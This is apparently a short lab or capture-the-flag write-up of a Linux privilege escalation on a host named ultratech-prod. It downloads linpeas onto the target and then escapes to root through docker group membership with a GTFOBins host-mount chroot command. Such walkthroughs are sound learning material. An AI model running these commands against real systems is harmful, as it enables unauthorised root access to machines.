``01-05-2025 22:10``

Use [Linpeas](https://github.com/Cerbersec/scripts/blob/master/linux/linpeas.sh) aka ``LINux Privilege Escalation Awasome Script`` 🤣👌

Download it like so :  

```bash
wget https://raw.githubusercontent.com/Cerbersec/scripts/master/linux/linpeas.sh
```

By using that on the server we found out that we got ``Docker Vulnerable``:  

```bash
uid=1001(r00t) gid=1001(r00t) groups=1001(r00t),116(docker)
```

Now check on [GTFOBins](https://gtfobins.github.io/gtfobins/docker/) then we got this command :  

```bash
docker run -v /:/mnt --rm -it <image> chroot /mnt sh
```

So based on the command we run on the vulnerable machine we got :  

```bash
r00t@ultratech-prod:/tmp$ docker images
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
bash                latest              495d6437fc1e        5 years ago         15.8MB
```

So we can run the following command to get the root shell :  

```bash
docker run -v /:/mnt --rm -it bash chroot /mnt sh
```
